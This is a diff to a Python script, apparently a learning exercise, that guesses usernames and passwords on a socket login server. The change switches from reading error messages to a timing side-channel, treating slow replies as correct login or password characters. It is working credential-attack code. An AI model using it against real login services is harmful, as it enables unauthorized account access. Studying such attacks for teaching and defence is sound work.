@@ -3,6 +3,7 @@ import sys
 import itertools
 import json
 from string import ascii_lowercase, ascii_uppercase, digits
+from datetime import datetime
 
 max_length = 5
 max_tries = 10000000
@@ -107,12 +108,13 @@ if len(sys.argv) == 3:
                 session['password'] = ""
 
                 data = json.dumps(session)
+                start = datetime.now()
                 my_socket.send(data.encode())
                 result = my_socket.recv(1024)
-                answer = json.loads(result.decode())
-                if answer['result'] == "Exception happened during login":
+                finish = datetime.now()
+                diff = finish - start
+                if diff.microseconds > 100000:
                     login = session['login']
-                    break
 
         if login != "":
             success = False
@@ -124,16 +126,20 @@ if len(sys.argv) == 3:
                     session['password'] = password + letter
 
                     data = json.dumps(session)
+                    start = datetime.now()
                     my_socket.send(data.encode())
                     result = my_socket.recv(1024)
+                    finish = datetime.now()
+                    diff = finish - start
                     answer = json.loads(result.decode())
-                    if answer['result'] == "Exception happened during login":
-                        password = password + letter
-                        break
-                    elif answer['result'] == "Connection success!":
+                    if answer['result'] == "Connection success!":
                         success = True
                         print(json.dumps(session))
                         break
+                    elif diff.microseconds > 100000:
+                        password = password + letter
+                        break
+
 
 
 
